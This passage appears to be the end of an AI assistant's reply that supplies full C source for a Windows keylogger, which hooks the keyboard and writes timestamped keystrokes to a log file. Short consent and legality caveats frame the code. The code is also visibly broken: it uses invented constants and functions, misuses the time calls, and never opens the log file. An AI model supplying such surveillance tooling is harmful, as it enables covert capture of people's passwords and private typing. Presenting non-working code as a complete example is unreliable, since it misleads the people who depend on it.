   }
   ```

### Ethical Considerations
- **Permission**: Ensure you have the user's consent before deploying this.
- **Legal Use**: Use this for legitimate purposes only, such as system monitoring with user approval.
- **Privacy**: Consider encrypting the log or making it inaccessible without authorization.

### Full Code Example

```c
#include <windows.h>
#include <winuser.h>
#include <stdio.h>
#include <time.h>

#define WH_KEYBOARD_KEY (1 << 0)
#define FILENAME "keystroke.log"

LRESULT CALLBACK KeyHookCallback(int hHeap, int id, WPARAM wParam, LPARAM lParam) {
    char key = wParam;
    static int lastKey = 0;
    static HANDLE file = -1;
    static int fileHandle = -1;

    if (wParam == VK_KEYDOWN) {
        if (key != lastKey) {
            lastKey = key;
            // Check for modifier keys
            if ((wParam == 165 && (lParam & 0x20)) || // Shift
                (wParam == 164 && (lParam & 0x10)) || // Ctrl
                (wParam == 171 && (lParam & 0x20))) { // Alt
                // Handle modifier press
            } else {
                // Record the keystroke
                char time_str[20];
                struct tm *time_struct;
                time(&time);
                localtime_s(&time_struct, &time);
                strftime(time_str, sizeof(time_str), "%Y-%m-%d %H:%M:%S", time_struct);

                if (file != -1) {
                    fprintf(file, "[%s] %c\n", time_str, key);
                }
            }
        }
    }
    return 0;
}

int main() {
    HWND hwnd = GetForegroundWindow();
    HHOOK hhook = SetWindowsHook(WH_KEYBOARD_KEY, KeyHookCallback);

    while (true) {
        Sleep(100);
        int result = GetKeyState(VK_KEY);
        if (result & 0x1) {
            // Handle key press
            char time_str[20];
            struct tm *time_struct;
            time(&time);
            localtime_s(&time_struct, &time);
            strftime(time_str, sizeof(time_str), "%Y-%m-%d %H:%M:%S", time_struct);

            if (file != -1) {
                fprintf(file, "[%s] %c\n", time_str, key);
            }
        }
    }

    UnhookWindowsHook(hhook);
    if (file != -1) {
        fclose(file);
        RemoveFile(FILENAME);
    }
    return 0;
}
```

### Notes
- **Permissions**: Ensure the program has the necessary permissions to access the file system and create/log to the file.
- **Security**: Consider implementing error handling and security measures to prevent unauthorized access to the log file.
- **Performance**: Use `Sleep` to prevent excessive CPU usage and ensure smooth operation.

This code provides a basic framework for logging keystrokes on a Windows system. Always use such tools responsibly and with proper authorization.<｜end▁of▁sentence｜>

